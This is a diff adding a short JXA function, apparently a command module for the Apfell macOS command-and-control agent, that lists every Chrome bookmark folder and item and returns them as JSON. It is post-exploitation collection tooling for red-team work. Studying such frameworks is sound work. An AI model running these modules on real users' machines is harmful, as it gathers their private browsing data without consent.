@@ -1,0 +1,31 @@
+exports.chrome_bookmarks = function(task, command, params){
+	var all_data = [];
+	try{
+		var ch = Application("Google Chrome");
+		if(ch.running()){
+            var folders = ch.bookmarkFolders;
+            for (var i = 0; i < folders.length; i ++){
+                var folder = folders[i];
+                var bookmarks = folder.bookmarkItems;
+                all_data.push("Folder Name: " + folder.title());
+                for (var j = 0; j < bookmarks.length; j++){
+                    var info = "Title: " + bookmarks[j].title() +
+                    "\\nURL: " + bookmarks[j].url() +
+                    "\\nindex: " + bookmarks[j].index() +
+                    "\\nFolder/bookmark: " + i + "/" + j;
+                    all_data.push(info); //populate our array
+                }
+            }
+        }
+        else{
+            return "Chrome is not running";
+        }
+	}catch(error){
+		var err = error.toString();
+		if(err == "Error: An error occurred."){
+		    return err + " Apfell was denied access to Google Chrome (either by popup or prior deny).";
+		}
+	}
+	return JSON.stringify(all_data, null, 2);
+};
+COMMAND_ENDS_HERE
